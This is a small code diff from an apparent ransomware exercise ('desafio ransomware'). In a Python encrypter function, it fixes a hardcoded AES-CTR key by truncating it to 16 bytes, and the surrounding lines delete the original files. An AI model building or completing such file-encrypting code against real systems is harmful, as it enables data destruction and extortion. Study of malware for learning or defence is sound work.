@@ -16,7 +16,7 @@ def encrypter(directory):
 
             os.remove(itempath)
 
-            key = b"desafioransomware"
+            key = b"desafioransomware"[:16]
             aes = pyaes.AESModeOfOperationCTR(key)
 
             crypto_data = aes.encrypt(file_data)
